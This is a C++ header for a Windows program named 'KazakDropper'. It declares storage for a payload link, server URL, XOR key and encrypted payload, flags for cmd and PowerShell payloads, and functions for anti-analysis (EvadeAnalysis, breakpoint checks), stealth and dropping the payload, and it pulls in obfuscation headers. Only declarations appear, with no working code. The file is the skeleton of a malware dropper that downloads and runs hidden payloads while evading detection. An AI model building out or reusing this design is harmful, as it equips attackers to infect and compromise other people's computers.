#pragma once

#include <Windows.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <thread>
#include <WinInet.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <cstdio>
#include <fstream>


#include "../headers/obfuscation/li.h"
#include "obfuscation/xor.h"

#pragma comment(lib,"WinInet.lib")

struct Storage
{
	std::string PayloadLink;
	std::string EncryptedPayload;
	std::string DecryptedPayload;
	std::string XorKey;
	std::string ServerURL;
	std::string PayloadVersion;

	bool CmdPayload = false;
	bool PowerShellPayload = false;
	int	ExecutedTimes = 0;


};

namespace KazakDropper
{
	bool EvadeAnalysis();
	BOOL IsBp(const char* lpszModule, const char* lpszFunction);

	void Stealth();
	void PreparePayload();

	void DropPayload(std::string payload);
}

namespace KazakUtils
{
	std::string replace_all(std::string& subject, const std::string& search, const std::string& replace);
	std::string StringWrapper(const std::string& url);
}
